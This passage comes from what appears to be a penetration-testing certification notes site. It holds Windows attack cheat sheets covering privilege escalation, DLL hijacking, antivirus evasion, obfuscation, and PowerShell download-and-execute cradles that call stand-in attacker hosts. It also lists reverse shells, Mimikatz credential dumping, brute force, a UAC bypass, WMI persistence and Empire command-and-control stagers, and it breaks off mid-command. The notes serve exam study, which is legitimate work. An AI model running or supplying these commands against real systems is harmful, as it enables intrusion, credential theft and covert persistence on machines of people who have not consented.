-Command \"mshta.exe http://10.10.15.3:8080/ljUAsN.hta\"\n\n\n\n\nReferences:\nhttps://powersploit.readthedocs.io/en/latest/Privesc/Invoke-ServiceAbuse/\nhttps://cheats.philkeeble.com/windows/local-privilege-escalation\n</code></pre></p> <p>Finding and Exploiting DLL Hijacking Vulnerabilities <pre><code># Run Process Monitor with following filters\nResult.      &gt; contains &gt; NAME NOT FOUND\nPath         &gt; end with &gt; .dll\nProcess Name &gt; is       &gt; dvta.exe\n\n# Check that DWrite.dll and VERSION.dll are missed payload (NAME NOT FOUND) which located directory where attacker have WRITE access.\n\n# Generate msfvenom payload and upload to directory\n$ msfvenom -p windows/meterpreter/reverse_tcp LHOST={IP} LPORT={PORT} -f dll -o DWrite.dll\n\n$ python3 -m http.server 80\n\n# Upload file to Missed Directory and re run dvta.exe file to gain Administrator Rights.\n\n\n\nReferences:\nhttps://notchxor.github.io/oscp-notes/4-win-privesc/6-dll-hijacking/\n</code></pre></p> <p>Bypassing AV <pre><code># Veil-Framework - Generate Payload\nUse Evaseion\nUse python/meterpreter/rev_tcp.py\ngenerate\n\n# Msfvenom - Generate Payload \nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe   -e x86/shikata_ga_nai -i 9 -o payload.exe\n\n\n# UPX - Compress files to Bypass AV\n$ upx --best --ultra-brute payload.exe\n\n\n# Upload file and run\n\nNOTE:  Msfvenom payloads does not work in that case\n</code></pre></p>"},{"location":"eCPPT%20Materials/Network%20Security/#anonymous","title":"Anonymous","text":"<p>HTTP Proxies <pre><code># Tests\nhttps://hide.me/en/proxy\n\n# Proxy lists\nhttps://hidemy.name/en/proxy-list/\n\n# Anonymous Tools\nhttp://www.all-nettools.com/\nhttps://centralops.net/co/\nhttp://do-know.com/privacy-test.html\nhttps://pentest-tools.com/\n\n\n# TOR\nhttps://www.torproject.org/ \n\nNOTE : TOR only works for TCP streams and can be used by any application with SOCKS support\n</code></pre></p> <p>HTTP_VIA / HTTP_X_FORWRDED_FOR <pre><code># Standart HTTP Communication string\nREMOTE_ADDR = 98.10.50.155              # Target IP \nHTTP_ACCEPT_LANGUAGE = en\nHTTP_USER_AGENT = Mozilla/4.0 (compatible; MISE 5.0; Windows 98)\nHTTP_HOST = www.elearnsecurity.com\nHTTP_VIA = not determined\nHTTP_X_FORWARD = not determined\n\n# Proxy Communication String\nREMOTE_ADDR = 94.86.100.1               # Proxy IP\nHTTP_ACCEPT_LANGUAGE = en\nHTTP_USER_AGENT = Mozilla/4.0 (compatible; MISE 5.0; Windows 98)\nHTTP_HOST = www.elearnsecurity.com\nHTTP_VIA = 94.86.100.1 (Squid/5.4.STABLE7)    # Proxy IP\nHTTP_X_FORWARD = 98.10.50.155                 # Target IP\n\n# High Anonymity Proxy Communication String\nREMOTE_ADDR = 94.86.100.1                     # Proxy IP\nHTTP_ACCEPT_LANGUAGE = en\nHTTP_USER_AGENT = Mozilla/4.0 (compatible; MISE 5.0; Windows 98)\nHTTP_HOST = www.elearnsecurity.com\nHTTP_VIA = not determined\nHTTP_X_FORWARD = not determined\n</code></pre></p> <p>Tunneling For Anonymity <pre><code># There are specifically 2 effective types for anonymity: SSH and IPSEC VPNs\n\n# Local Port Forwarding Through SSH\nssh -L [LOCAL PORT TO LISTEN ON]:[REMOTE MACHINE]:[REMOTE PORT] [USERNAME]@[SSHSERVER]\n\n# Create a tunnel from our local port 3000, to the localhost address on the SSH server, on port 3306\nssh -L 3000:localhost:3306 els@192.168.231.135\n</code></pre></p>"},{"location":"eCPPT%20Materials/Network%20Security/#social-engineering","title":"Social Engineering","text":"<pre><code># Setoolkit Tool\nhttps://github.com/trustedsec/social-engineer-toolkit\n</code></pre> <p>Linux test.deskstop <pre><code>[Desktop Entry]\nType=Application\nName=Update\nExec=/bin/bash ls -la\nIcon=/usr/share/yelp-xsl/xslt/common/icons/yelp-note-important.svg\n</code></pre></p> <p>Linux test.desktop generator</p>"},{"location":"eCPPT%20Materials/Powershell%20For%20Pentesting/","title":"Powershell For Pentesting","text":""},{"location":"eCPPT%20Materials/Powershell%20For%20Pentesting/#powershell-fundamentals","title":"PowerShell Fundamentals","text":"<pre><code># PowerSploit\nhttps://github.com/PowerShellMafia/PowerSploit \n\nInvoke-AllChecks\nInvoke-PrivescAudit\n\nInvoke-ServiceAbuse -Name &lt;service_name&gt;\n</code></pre> <p>PowerShell CLI <pre><code># Executable Folders\nC:\\Windows\\System32\\WindowsPowerShell        # 64 Bit OS\nC:\\Windows\\SysWOW64\\WindowsPowerShell        # 32 Bit OS\n\n# PS History file\n%AppData%\\Microsoft\\Windows\\PowerShell\\PSReadLine\n\n# Check if PS Process is running as 64 Bit\nPS &gt; [environment]::Is64BitOperatingSystem\n\n# PS Help menu\nPS &gt; powershell /?\n\n# ExecutionPolicy Bypass\nPS &gt; Get-ExecutionPolicy\nPS &gt; Set-ExecutionPolicy Bypass -Scope Process\n\nC:\\&gt; powershell -ExecutionPolicy Bypass .\\script.ps1\nC:\\&gt; powershell -ExecutionPolicy Unrestricted .\\script.ps1\n\n\n# Hides PS Window\nC:\\&gt; powershell -WindowStyle Hidden .\\script.ps1\n\n\n# Specify Command or Script Block\nC:\\&gt; powershell -Command [Command or Script Block]\nC:\\&gt; powershell -Command Invoke-Command -ScriptBlock { Get-Process }\nC:\\&gt; powershell -Command Invoke-Command -ScriptBlock { Get-EventLog -LogName security }\"\n\nPS &gt; Invoke-Command -ScriptBlock { param($p1, $p2)\n    \"p1: $p1\"\n    \"p2: $p2\"\n    } -ArgumentList \"First\", \"Second\"\n\n\n# Execute Base64 encoded script\nPS &gt; $string = {Get-Process}\nPS &gt; $encodedcommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($string))\nPS &gt; powershell.exe -EncodedCommand $encodedcommand\n\n\n# Execute Script with NoProfile Parameter\nC:\\ &gt; powershell -NoProfile .\\script.ps1\n\n\n# Downgrade PS Version to 2\nC:\\ &gt; powershell -Version 2\n\n\n# Abbreviated above commands\n\npowershell.exe -ep Bypass         # ExecutionPolicy Bypass\npowershell.exe -ex by             # ExecutionPolicy Bypass\n\npowershell.exe \u2013enco              # EncodedCommand\npowershell.exe \u2013ec                # EncodedCommand\n\npowershell.exe \u2013W h               # WindowStyle Hidden\npowershell.exe \u2013Wi hi             # WindowStyle Hidden\n\n\n\n# Get-Help - Obtain Information\nPS &gt; Get-Help Get-Help\nPS &gt; Get-Help Get-Process -Full\nPS &gt; Get-Help Get-Process -Examples\nPS &gt; Get-Help Get-Process -Online\nPS &gt; Get-Update\n\n\n# List all Cmdlets, Alliases, Functions, Workflows, Filters, Scripts\nPS &gt; Get-Command \nPS &gt; Get-Command -Name *Firewall*\n</code></pre></p> <p>Cmdlets <pre><code># List all Properties of Cmdlets\nPS &gt; Get-Process | Format-List *\nPS &gt; Get-Process | Select-Object -Property *\n\n# Pipeline \nPS &gt; Get-Process | Select-Object -Property Processname\nPS &gt; Get-Process | Select-Object -First 10\nPS &gt; Get-Process | Sort-Object -Unique \nPS &gt; Get-Process | Sort-Object -Unique | Select-Object -First 10\n\n# List All Aliases\nPS &gt; Get-Alias\nPS &gt; Get-Alias -Definiton -Get-Process \n\n# WMI Objects - Operating System\nPS &gt; Get-WmiObject -Class win32_operatingsystem  | Select-Object -Property \n\n# WMI Objects - Services\nPS &gt; Get-WmiObject -Class win32_service  | fl *\nPS &gt; Get-WmiObject -Class win32_service  | Sort-Object -Unique PathName | fl PathName\n\n# List all Services\nPS &gt; Get-Service | Sort-Object Status -Descenting\n\n# Export-CSV\nPS &gt; Get-Process | Export-Csv C:\\Process.csv\n\n# Exploring Windows Registry\nPS &gt; cd HKLM:\\\nPS &gt; cd .\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\n\n# Find *.txt files in Directory with Pattern - pass*\nPS &gt; Select-String -Path C:\\Directory\\*.txt -Pattern pass*\n\n# Find with Recursively - Root Directory - C:\\ | Pattern - pass* | File Extension - *.txt\nPS &gt; ls -r C:\\ -File *.txt | % {Select-String -Path $_ -Pattern pass*}\n</code></pre></p> <p>Modules <pre><code># List of Imported Modules\nPS &gt; Get-Module\nPS &gt; Get-Module -ListAvailable\n\n# Import Module\nPS &gt; Import-Module .\\script.psm1\n\n# PowerSploit\nhttps://github.com/PowerShellMafia/PowerSploit\n\nPS &gt; Improt-Module PowerSploit             # Import Module\nPS &gt; Get-Module                            # Check\nPS &gt; Get-Command -Module Powersploit # List All Available Commands of PowerSplloit\n\n\nPS &gt; Get-Help Invoke-PrivescAudit       # Help on cmdlet\nPS &gt; Get-Help Wrtie-HijackDll           # Help on cmdlet\n</code></pre></p> <p>Writing a Windows PowerShell Module </p> <p>Scripts <pre><code># List Files\nPS &gt; $file = \"script.txt\"\nPS &gt; Get-Content $file\n\n# Foreach Loop\nPS &gt; $services = Get-Service\nPS &gt; ForEach-Object ($service in $services) { $service.Name }\n\nPS &gt; Get-Service | Foreach-Object {$__.Name}\nPS &gt; Get-Service | % {$__.Name}\n\n# Where Object\nPS &gt; \u00a0Get-Service | Where-Object { $_.Status -match \"Running\"}\n</code></pre></p> <p>Script which takes an Argument and list files <pre><code> Param(\n    [Parameter(mandatory=$true)][string]$file\n)\nGet-Content \"$file\"\n</code></pre></p> <p>Port-Scanner.ps1 <pre><code>$ports=(81,444)\n$ip=\"192.168.13.250\"\n\nforeach ($port in $ports) {try{$socket=New-Object System.Net.Sockets.TcpClient($ip,$port);}\n\ncatch{}; \n\nif ($socket -eq $null) {echo $ip\":\"$port\" - Closed\";}else{echo $ip\":\"$port\" -\nOpen\"; $socket = $null;}}\n</code></pre></p> <p>Objects <pre><code># List all available methods\nPS &gt; Get-Process | Get-Member -MemberType Method\nPS &gt; Get-Process firefox | Get-Member -MemberType Method\n\n# Kill Process\nPS &gt; Get-Process -Name firefox | Kill\n\n\n# Create New Object to Download file\nPS C:\\&gt; $webclient = New-Object System.Net.WebClient\nPS C:\\&gt; $payload_url = \"https://attacker_host/payload.exe\"\nPS C:\\&gt; $file = \u201cC:\\ProgramData\\payload.exe\"\nPS C:\\&gt; $webclient.DownloadFile($payload_url,$file)\n</code></pre></p>"},{"location":"eCPPT%20Materials/Powershell%20For%20Pentesting/#offensive-powershell","title":"Offensive PowerShell","text":""},{"location":"eCPPT%20Materials/Powershell%20For%20Pentesting/#download-and-execution","title":"Download and Execution","text":"<pre><code># Download And Execution In Memory. - Net.WebClient\nPS &gt; iex (New-Object Net.Webclient).DownloadString(\u201chttp://attacker_url/script.ps1\")\n\nC:\\&gt; powershell.exe iex (New-Object Net.Webclient).DownloadString(\u2018http://attacker_url/script.ps1\u2019)\n\n-----------------------------------------------------------------------------\n\n# Download file on Disk. - Net.WebClient\nPS &gt; iex (New-Object Net.Webclient).DownloadFile(\u201chttp://attacker_url/script.ps1\", \"C:\\programdata\\payload.exe\")\n\nPS C:\\&gt; $downloader = New-Object System.Net.WebClient\nPS C:\\&gt; $payload = \"http://attacker_URL/payload.exe\"\nPS C:\\&gt; $local_file = \"C:\\programdata\\payload.exe\"\nPS C:\\&gt; $downloader.DownloadFile($payload,$local_file)\n\n-----------------------------------------------------------------------------\n\n# Use System Proxy and Default Credentials.  - Net.WebClient\nPS C:\\&gt; $downloader = New-Object System.Net.WebClient\nPS C:\\&gt; $payload = http://attacker_URL/script.ps1\nPS C:\\&gt; $cmd = $downloader.DownloadFile($payload)\nPS C:\\&gt; $proxy = [Net.WebRequest]::GetSystemWebProxy()\nPS C:\\&gt; $proxy.Credentials = [Net.CredentialCache]::DefaultCredentials\nPS C:\\&gt; $downloader.Proxy = $proxy\nPS C:\\&gt; iex $cmd\n\n-----------------------------------------------------------------------------\n\n# Download and Execute in memory   - Net.WebRequest\nPS C:\\&gt; $req = [System.Net.WebRequest]::Create(\"http://attacker_URL/script.ps1\")\nPS C:\\&gt; $res = $req.GetResponse()\nPS C:\\&gt; iex ([System.IO.StreamReader]($res.GetResponseStream())).ReadToEnd()\n\n-----------------------------------------------------------------------------\n\n# USe System Proxy and Default Credentials  - Net.WebRequest\nPS C:\\&gt; $req = [System.Net.WebRequest]::Create(\"http://attacker_URL/script.ps1\")\nPS C:\\&gt; $res = $req.GetResponse()\nPS C:\\&gt; $proxy = [Net.WebRequest::GetSystemWebProxy()\nPS C:\\&gt; $proxy.Credentials = [Net.CredentialCache]::DefaultCredentials\nPS C:\\&gt; $req.Proxy = $proxy\nPS C:\\&gt; iex ([System.IO.StreamReader]($res.GetResponseStream())).ReadToEnd()\n\n-----------------------------------------------------------------------------\n\n# Download and Execute in memory  - System.Xml.XmlDocument\n\nPS C:\\&gt; $xmldoc = New-Object System.Xml.XmlDocument\nPS C:\\&gt; $xmldoc.Load(\"http://attacker_URL/file.xml\")\nPS C:\\&gt; iex $xmldoc.command.a.execute\n\n\nfile.xml :\n&lt;?xml version=\"1.0\"?&gt;\n&lt;command&gt;\n&lt;a&gt;\n&lt;execute&gt;Get-Process&lt;/execute&gt;\n&lt;/a&gt;\n&lt;/command&gt;\n\n-----------------------------------------------------------------------------\n\n# Com Objects for Download and Execution  - Msxml2.XMLHTTP\nPS C:\\&gt; $downloader = New-Object \u2013ComObject Msxml2.XMLHTTP\nPS C:\\&gt; $downloader.open(\u201cGET\u201d, \u201chttp://attacker_URL/script.ps1\u201d, $false)\nPS C:\\&gt; $downloader.send()\nPS C:\\&gt; iex $downloader.responseText\n\n-----------------------------------------------------------------------------\n# Com Objects for Download and Execution  - WinHttp.WinHttpRequest.5.1\nPS C:\\&gt; $downloader = New-Object \u2013ComObject WinHttp.WinHttpRequest.5.1\nPS C:\\&gt; $downloader.open(\u201cGET\u201d, \u201chttp://attacker_URL/script.ps1\u201d, $false)\nPS C:\\&gt; $downloader.send()\nPS C:\\&gt; iex $downloader.responseText\n\n-----------------------------------------------------------------------------\n\n# ExecutionPolicy Bypass and Hiddne Window\nC:\\&gt; powershell.exe \u2013ExecutionPolicy bypass \u2013Window hidden .\\downloader.ps1 \n\n-----------------------------------------------------------------------------\n\n# Automation Script\nhttps://github.com/danielbohannon/Invoke-CradleCrafter\n</code></pre> <p>Download Evasions <pre><code># Hosted file, where SSL is presented\n\n-----------------------------------------------------------------------------\n\n# Use different Extensions. Script still executes\nPS C:\\&gt; iex (New-Object Net.Webclient).DownloadString(\u201chttp://attacker_url/logo.gif\")\n\n-----------------------------------------------------------------------------\n\n# Custom user-agent Header\nPS C:\\&gt; $downloader = New-Object System.Net.WebClient\nPS C:\\&gt; $downloader.Headers.Add(\"user-agent\", \"Mozilla/5.0 (Windows NT 10.0;\nWin64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.146\nSafari/537.36\")\nPS C:\\&gt; $payload = \"http://192.168.13.62/Get-ProcessPaths.ps1\"\nPS C:\\&gt; $command = $downloader.DownloadString($payload)\nPS C:\\&gt; iex $command\n</code></pre></p> <pre><code># In Memory\n\u2022 Net.WebClient DownloadString\n\u2022 Net.WebClient DownloadData\n\u2022 Net.WebClient OpenRead \n\u2022 .NET [Net.HttpWebRequest] class\n\u2022 Word.Application COM Object\n\u2022 Excel.Application COM Object\n\u2022 InternetExplorer.Application COM Object\n\u2022 MsXml2.ServerXmlHttp Com Object\n\u2022 Certutil.exe w/ -ping argument\n\n# On Disk\n\u2022 Net.WebClient DownloadFile method\n\u2022 BITSAdmin.exe\n\u2022 Certutil.exe w/ -urlcache argument\n</code></pre>"},{"location":"eCPPT%20Materials/Powershell%20For%20Pentesting/#obfuscation","title":"Obfuscation","text":"<pre><code>#Invoke-Obfuscation\nhttps://github.com/danielbohannon/Invoke-Obfuscation\nPS &gt; Import-Module .\\Invoke-Obfuscation.psd1\n\n# Invoke-Obfuscation Commands\nInvoke-Obfuscation &gt; show options\nInvoke-Obfuscation &gt; set ScriptBlock {ps1 script we want to obfuscate}\nInvoke-Obfuscation &gt; STRING        # STRING/AST/TOKEN/ECNODING/COMPRESS...\nInvoke-Obfuscation &gt; ENCODE     \n\nInvoke-Obfuscation &gt; RESET         # Dont Append Obfuscations Each Others\nInvoke-Obfuscation &gt; LAUNCHER      # Generate Launcher\n\n\n# Base64 Encoding\nPS &gt; $command = \u2018net user admin1 \u201cp@ssw0rd9001\u201d /ADD; net localgroup administrators admin1 /add\u2019\nPS &gt; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)\nPS &gt; $encodedCommand = [Convert]::ToBase64String($bytes)\nPS &gt; $encodedCommand\nPS &gt; powershell.exe -encodedcommand $encodedCommand\n</code></pre>"},{"location":"eCPPT%20Materials/Powershell%20For%20Pentesting/#information-gathering-and-recon","title":"Information Gathering And Recon","text":"<p>Host Discovery <pre><code># Powersploit - Invoke-PortScan\nPS &gt; Import-Module .\\Powersploit.psd1\nPS &gt; Invoke-PortScan -Hosts \"192.168.1.1/24\" -PingOnly\nPS &gt; Invoke-PortScan -HostFile ips.txt -PingOnly\nPS &gt; Invoke-PortScan -HostFile ips.txt -PingOnly | Export-Csv C:\\output.txt\n</code></pre></p> <p>Ports Scan <pre><code># PowerSploit - Invoke-PortScan\nPS &gt; Invoke-PortScan -HostFile live_hosts.txt -ports \"53-81\"\n\nPS &gt; Invoke-PortScan -HostFile live_hosts.txt -oG port_scan.gmap -f ports \"1-81\"\n\n-----------------------------------------------------------------------------\n\n# Posh-Secmod - Invoke-ARPScan\nhttps://github.com/darkoperator/Posh-SecMod\n\nPS &gt; Import-Module .\\Discovery.psm1\nPS &gt; Invoke-ARPScan -CIDR 192.168.1.1/24\n</code></pre></p> <p>Reverse DNS Lookup <pre><code># Posh-Secmod - Invoke-ReverseDnsLookup\nhttps://github.com/darkoperator/Posh-SecMod\n\nPS &gt; Import-Module .\\Discovery.psm1\nPS &gt; Invoke-ReverseDnsLookup -CIDR 192.168.1.1/24\n</code></pre></p> <p>DNSRecord &amp; HostRecord <pre><code>PS &gt; Resolve-DNSRecord -Target microsoft.com  -Type NS\nPS &gt; Resolve-HostRecord -Target microsoft.com\n</code></pre></p> <p>Directory Fuzzing <pre><code># PowerSploit - Get-HttpStatus\nPS &gt; Get-HttpStatus -Target example.com -Path dictionary.txt -Port 80 | ? { $_Status -match \"ok\"}\n</code></pre></p>"},{"location":"eCPPT%20Materials/Powershell%20For%20Pentesting/#post-exploitation","title":"Post Exploitation","text":"<p>Nishang - Post Exploitation <pre><code># Nishang Gather - Copy-VSS\nPS &gt; iex (New-Object Net.Webclient).DownloadString(\u201chttps://raw.githubusercontent.com/samratashok/nishang/master/Gather/Copy-VSS.ps1\"); Copy-VSS\n\n# Nishang Gather - Get-Information\nPS &gt; \u00a0iex (New-Object Net.Webclient).DownloadString(\u201chttps://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-Information.ps1\"); Get-Information\n\n# Nishang Gather - Get-PassHints\nPS &gt; \u00a0iex (New-Object Net.Webclient).DownloadString(\u201chttps://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHints.ps1\"); Get-PassHints\n\n# Nishang Gather - Invoke-Mimikatz\nPS &gt; \u00a0iex (New-Object Net.Webclient).DownloadString(\u201chttps://github.com/samratashok/nishang/blob/master/Gather/Invoke-Mimikatz.ps1\"); Invoke-Mimikatz -DumpCreds\n\n-----------------------------------------------------------------------------\n\n# Nishang Brute Force - MSSQL, Active Directory, WEB, FTP\nPS &gt; Invoke-BruteForce \u2013ComputerName targetdomain.com \u2013UserList C:\\temp\\users.txt \u2013PasswordList C:\\temp\\pwds.txt \u2013Service ActiveDirectory \u2013StopOnSuccess -Verbose\n\n-----------------------------------------------------------------------------\n\n# Nishang Reverse PowerShell\n$ nc -nvlp 4444\nPS &gt;  iex (New-Object Net.WebClient).DownloadString(\"https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1\"); Invoke-PowerShellTcp -Reverse -IPAddress &lt;listener_IP&gt; -Port 4444\n\n-----------------------------------------------------------------------------\n</code></pre></p> <p>PowerSploit - Post Exploitation <pre><code># PowerUp - Privilege Escalation\nPS &gt; \u00a0Import-Module .\\Privesc.psm1\nPS &gt; \u00a0Get-Command -Module Privesc\nPS &gt;  Invoke-AllChecks\nPS &gt;  Invoke-AllChecks - HTMLReport\n\n-----------------------------------------------------------------------------\n\n# PowerSploit - Invoke-DllInjection\n$ msfvenom -p windows/exec CMD=\u201ccmd.exe\u201d -f dll &gt; cmd.dll\n\nPS C:\\&gt; iex (New-Object Net.Webclient).DownloadFile(\u2018http://attacker_URL/cmd.dll\u2019,\u2018C:\\programdata\\cmd.dll\u2019)\n\nPS &gt; iex (New-Object Net.Webclient).DownloadString(\"https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-DllInjection.ps1\"); Invoke-DLLInjection \u2013ProcessID 7420 C:\\programdata\\cmd.dll\n</code></pre></p> <p>psgetsystem <pre><code># https://github.com/decoder-it/psgetsystem\n\n# Get NT\\SYSTEM Privilege form Administrator\nPS &gt; .\\psgetsys.ps1\nPS &gt; [MyProcess]::CreateProcessFromParent(system_pid,\"command_to_execute\")\n\n# Get List of NT\\SYSTEM process\nPS &gt; \u00a0Get-Process -IncludeUserName | ? {$_.username -match \"SYSTEM\"} | Select-Object -Property username,name,id\n</code></pre></p> <p>Empire - Post Exploitation <pre><code># https://github.com/EmpireProject/Empire\n\n$ git clone https://github.com/EmpireProject/Empire\n$ ./setup/install.sh\n\n(Empire) &gt; listeners\n(Empire) &gt; uselistener [TAB]\n(Empire) &gt; uselistener http\n(Empire) &gt; help\n\n# Set up SSL listener\n$ ./Empire/setup/cert.sh                  # Generate SSL keys\n(Empire: listener/http) &gt; set CertPath &lt;Directory where SSL keys are&gt;\n(Empire: listener/http) &gt; execute\n\n(Empire: listener/http) &gt; back\n(Empire: listener) &gt; listeners\n\n\n\n\n# Create Stager Payload\n(Empire: listener) &gt; usestager [TAB]\n(Empire: listener) &gt; usestager multi/launcher\n(Empire: listener/multi/launcher) &gt; info                 # list of options\n(Empire: listener/multi/launcher) &gt; set listener http    # Generated listener\n(Empire: listener/multi/launcher) &gt; execute              # Generate Payload\n\n(Empire: listener/multi/launcher) &gt; agents         # List active sessions\n\n\n\n# Agents - Sessions\n(Empire: agents) &gt; help\n(Empire: agents) &gt; interact [TAB]                  # Interact with session\n(Empire: Interact) &gt; help                          # List of Commands\n(Empire: Interact) &gt; info\n(Empire: Interact) &gt; shell whoami                  # Execute Command\n(Empire: Interact) &gt; usemodule [TAB]               # List all Modules\n(Empire: Interact) &gt; searchmodule checks           # Search Modules\n\n(Empire: Interact) &gt; usemodule privesc/powerup/allchecks\n(Empire: powershell/privesc/powerup/allchecks) &gt; execute\n\n\n\n# Client-Side Attack - Use Macro\n\n(Empire: powershell/privesc/powerup/allchecks) &gt; main\n(Empire) &gt; usestager windows/macro\n(Empire: stager/windows/macro) &gt; set listener http           \n(Empire: stager/windows/macro) &gt; set OutFile &lt;Directory&gt;\n(Empire: stager/windows/macro) &gt; execute\n\n# Open Microsoft Word with developer permission. Enter the Visual Basic Editor with ALT+F11 and paste generate macro code into it. \n</code></pre></p> <pre><code># Generate Msfvenom Payload and initiate connection from remote machine\n\nmsf &gt; use exploit/multi/handler\nmsf &gt; set payload windows/x64/meterpreter/reverse_https\n\n$ Msfvenom -p windows/x64/meterpreter/reverse_https LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f psh-reflection &gt; payload.ps1\n\nC:\\&gt; powershell.exe iex (New-Object Net.Webclient).DownloadString(\u2018http://attacker_url/payload.ps1\u2019)\n\n\n-----------------------------------------------------------------------------\n\n# Powershell Module on Meterpreter\n\nmeterpreter &gt; load powershell\nmeterpreter &gt; powershell_shell\nmeterpreter &gt; powershell_execute 'Get-Process'\n\n\n-----------------------------------------------------------------------------\n\n\n# Pass an existing active agent Empire session over metasploit\nmsf &gt; use exploit/multi/script/web_delivery\nmsf &gt; set payload windows/meterpreter/reverse_https\nmsf &gt; set target 2\nmsf &gt; exploit\n\n(Empire): usemodule powershell/code_execution/Invoke_metasploitpayload\n(Empire): info\n(Empire): set URL &lt;MSFVenom Generated Payload&gt;\n(Empire): set Agent &lt;Agent&gt;\n(Empire): execute\n</code></pre> <p>UAC Bypass PowerShell Exploit Script <pre><code>Programs which can run to HIGH integrity without promting the UAC\n1. msfconfig.exe\n2. compmgmtlauncher.exe\n3. dccw.exe\n\n\n# Process Monitor Filters\nProcess Name.  &gt; is       &gt; mmc.exe\nProcess Name   &gt; is       &gt; compmgmtlauncher.exe\nResult         &gt; is       &gt; NAME NOT FOUND\nPATH           &gt; contains &gt; msc\n\n\n# Search path on Process Monitor and modify regedit value of this to \"C:\\windows\\system32\\cmd.exe\"\n\nHKCU\\Software\\Classes\\mscfile\\shell\\open\\command\n\n\n\n# Windows Runs\nRUN &gt; compmgmtlauncher.exe\n</code></pre></p> <p>Introduction to Leveraging WMI and Methods for Persistence <pre><code># Get Information About WMI instances, Classes and related information\nPS &gt; Get-WmiObject\nPS &gt; Get-Help Get-WmiObject\nPS &gt; Get-Help wmi\n\n# List all Namespaces within the root/cimv2 namespace along its namespaces classes\nPS &gt; Get-WmiObject -Namespace root/cimv2 -Class \"__NameSpace\"\nPS &gt; Get-WmiObject -Namespace root/cimv2 -Class \"__NameSpace\" | Select-Object -Property Name\n\nPS &gt; Get-WmiObject -Namespace root/cimv2 -List\nPS &gt; Get-WmiObject -Namespace root/cimv2 -List | ? {$_.Name -Match \"win32_service\"}\n\n# Get a specific service - win32_service\nPS &gt; Get-WmiObject -Class win32_service\nPS &gt; Get-WmiObject -Class win32_service | ? {$_.State -Match \"Running\"}\nPS &gt; Get-WmiObject -Class win32_service | ? {$_.Name -Match \"Defend\"}\n\n# Get a specific service - win32_process\nPS &gt; Get-WmiObject -Class win32_process\nPS &gt; Get-WmiObject -Class win32_process -List\n\n\n# Get Available methods of specifit Class\nPS &gt; Get-WmiObject -Class win32_process -List | Get-Member -MemberType Method\nPS &gt; Get-WmiObject -Class win32_service -List | Get-Member -MemberType Method\n\n\n\n# Create Process - CMD.exe\nPS &gt; $proc = Get-WmiObject -List win32_process\nPS &gt; $proc.Create(\"cmd.exe\")\n\nPS &gt; \u00a0Invoke-WmiMethod -Class win32_process -Name Create -ArgumentList cmd.exe\n\n\n# Launching Processes on Remote Computers\nPS &gt; Invoke-WmiMethod -Class win32_process -Name Create -ArgumentList cmd.exe -ComputerName 192.168.100.8 -Credential gibarbakadze\n\n# Check that Process is running on Remote Computer\nPS &gt; Get-WmiOnject -Class win32_process  -Filter (ProcessID= \"&lt;ProcessID&gt;\") -ComputerName 192.168.100.8 -Credential gibarbakadze\n\n# Kill Process on Remote Computer\nPS &gt; Get-WmiOnject -Class win32_process  -Filter (ProcessID= \"&lt;ProcessID&gt;\") -ComputerName 192.168.100.8 -Credential gibarbakadze | Remove-WmiObject \n</code></pre></p> <p>WMI - PowerLunk - Persistence <pre><code># https://github.com/Sw4mpf0x/PowerLurk\n\n# Write the notepad.exe process ID to C:\\temp\\log.txt whenever notepad.exe starts. Also Possible to run MSFVenom Payload \n\nPS &gt; iex (New-Object Net.Webclient).DownloadString(\u201chttps://raw.githubusercontent.com/Sw4mpf0x/PowerLurk/master/PowerLurk.ps1\"); Register-MaliciousWmiEvent -EventName LogNotepad -PermanentCommand \u201ccmd.exe /c echo %ProcessId% &gt;&gt; c:\\\\temp\\\\log.txt\u201d -Trigger ProcessStart -ProcessName notepad.exe\n\n\n\n# View Our Malicious WMI event\nPS &gt; iex (New-Object Net.Webclient).DownloadString(\u201chttps://raw.githubusercontent.com/Sw4mpf0x/PowerLurk/master/PowerLurk.ps1\"); Get-WmiEvent -Name LogNotepad\n\n\n\n# Remove Our Malicious WMI event\nPS &gt; iex (New-Object Net.Webclient).DownloadString(\u201chttps://raw.githubusercontent.com/Sw4mpf0x/PowerLurk/master/PowerLurk.ps1\"); Get-WmiEvent -Name LogNotepad | Remove-WmiObject\n</code></pre></p> <p>LAB -  Leveraging PowerShell During Exploitation <pre><code># Scan Host\nnmap -sS -sV -p- demo.ine.local\n\n# Port 4983 is opened. Open with Firefox to View Administrator Credentials\n\n# Impacket-Psexec \n$ Impacket-Psexec Administrator:'abc_123321!@#'@demo.ine.local\n$ whoami\n\n\n# Run Empire\n$ powershell-empire server\n$ powershell-empire client\n\n\n# Empire Setup Listener\n$ ./Empire/setup/cert.sh                  # Generate SSL keys\n(Empire) &gt; uselistener http\n(Empire: listener/http) &gt; set Host 10.10.10.15\n(Empire: listener/http) &gt; set Port 443\n(Empire: listener/http) &gt; set CertPath &lt;Directory where SSL keys are&gt;\n(Empire: listener/http) &gt; execute\n(Empire: listener/http) &gt; main\n\n\n# Empire Setup Stager\n(Empire) &gt; usestager multi/launcher\n(Empire: usestager/multi/launcher) &gt; set Listener http\n(Empire: usestager/multi/launcher) &gt; execute\n\n\n# Copy and paste the Empire-generated PowerShell code, to Impacket-Psexec\n\n# Empire Agents - Bounch of various interesting modules\n\n(Empire) &gt; agents\n(Empire: agents) &gt; interact &lt;agent&gt;\n(Empire: agents) &gt; help\n\n(Empire: Interact) &gt; usemodule powershell/situational_awareness/network/port_scan\n\n(Empire: Interact) &gt; usemodule powershell/situational_awareness/host/computerdetails\n\n(Empire: Interact) &gt; usemodule powershell/privesc/powerup/allchecks\n\n\n\n# Transfer our existing Empire Agent over to Metasploit\nmsf &gt; use exploit/multi/script/web_delivery\nmsf &gt; set target 2\nmsf &gt; set SRVHOST 10.10.10.15\nmsf &gt; set LHOST 10.10.10.15\nmsf &gt; set Payload windows/meterpreter/reverse_tcp\nmsf &gt; exploit\n\n(Empire: Interact) &gt; usemodule powershell/code_execution/invoke_metasploitpayload\n(Empire: Interact) &gt; set URL &lt;Metasploit Generated 